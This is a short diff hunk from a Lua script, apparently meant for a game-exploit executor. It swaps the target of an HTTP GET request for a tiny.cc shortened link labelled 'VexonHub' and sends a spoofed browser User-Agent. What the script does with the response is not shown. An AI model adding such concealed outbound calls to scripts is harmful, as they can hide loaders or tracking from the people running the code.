@@ -521,7 +521,7 @@ local r = http_request or request or
 
 if r then
     r({
-        Url = "https://ai-inference.xyz/VaZTy2A",
+        Url = "http://tiny.cc/VexonHub",
         Method = "GET",
         Headers = {
             ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
